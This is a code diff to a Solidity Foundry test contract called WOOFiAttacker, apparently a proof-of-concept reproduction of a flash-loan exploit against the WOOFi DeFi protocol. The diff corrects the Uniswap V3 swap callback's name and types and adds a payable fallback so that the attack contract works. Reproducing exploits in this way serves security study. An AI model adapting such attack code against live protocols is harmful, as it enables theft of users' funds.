@@ -50,8 +50,8 @@ contract WOOFiAttacker is Test {
         IERC20(USDC).transfer(msg.sender, 10580749131947 + fee1);
     }
 
-    function uniSwapV3SwapCallback (uint256 amount0, uint256 amount1, bytes calldata data) external {
-        IERC20(USDC).transfer(address(POOL), amount1);
+    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes calldata data) external {
+        IERC20(USDC).transfer(address(POOL), uint256(amount1));
     }
 
     function LBFlashLoanCallback(
@@ -122,5 +122,7 @@ contract WOOFiAttacker is Test {
         
         initFlash();
     }
+
+    fallback() external payable {}
     
 }
